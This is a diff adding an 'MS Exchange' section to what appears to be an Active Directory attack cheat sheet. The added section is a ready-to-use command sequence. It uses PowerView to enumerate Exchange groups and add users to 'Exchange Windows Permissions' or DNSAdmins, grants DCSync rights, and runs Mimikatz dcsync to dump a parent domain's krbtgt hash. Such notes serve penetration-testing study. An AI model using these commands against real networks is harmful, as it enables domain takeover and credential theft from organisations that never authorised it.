@@ -13,6 +13,7 @@
   * [Trust tickets](#Trust-tickets)
   * [Krbtgt hash](#Krbtgt-hash)
 * [Crossforest attacks](#Crossforest-attacks)
+  * [MS Exchange](#MS-Exchange)
   * [Kerberoast](#Kerberoast2)
   * [Trust flow](#Trust-flow) 
 * [Trust abuse SQL](#Trust-abuse-SQL) 
@@ -370,6 +371,45 @@ dir \\<FQDN PARENT DC>\C$
 #### Enter pssession to server!
 
 ## Crossforest attacks
+### MS Exchange
+![afbeelding](https://user-images.githubusercontent.com/43987245/119706037-bf8d3000-be59-11eb-84cc-6568ba6e5d26.png)
+
+#### Enumerate if exchange groups exist
+```
+. ./Powerview.ps1
+Get-DomainGroup *exchange* -Domain <DOMAIN>
+```
+
+#### Enumerate membership of the groups
+```
+Get-DomainGroupMember "Organization Management" -Domain <DOMAIN>
+Get-DomainGroupMember "Exchange Trusted Subsystem" -Domain <DOMAIN>
+```
+
+#### If we have privileges of a member of the Organization Management, we can add a user to the 'Exchange Windows Permissions' group.
+```
+$user = Get-DomainUser -Identity <USER>
+$group = Get-DomainGroup -Identity 'Exchange Windows Permissions' -Domain <DOMAIN>
+Add-DomainGroupMember -Identity $group -Members $user -Verbose
+```
+
+#### Add permissions to execute DCSYNC
+```
+Add-DomainObjectAcl -TargetIdentity 'DC=<PARENT DOMAIN>,DC=<TOP DOMAIN>' -PrincipalIdentity '<CHILD DOMAIN>\<USER>' -Rights DCSync -Verbose
+```
+
+#### Execute DCSYNC
+```
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:<PARENT DOMAIN>\krbtgt /domain:<PARENT DOMAIN>"'
+```
+
+#### If we have privileges of 'exchange user', who is a member of the Exchange Trusted Subsystem, we can add any user to the DNSAdmins group:
+```
+$user = Get-DomainUser -Identity <USER>
+$group = Get-DomainGroup -Identity 'DNSAdmins' -Domain <DOMAIN>
+Add-DomainGroupMember -Identity $group -Members $user -Verbose
+```
+
 ### Kerberoast2
 #### Enumerate users with SPN cross-forest
 ```
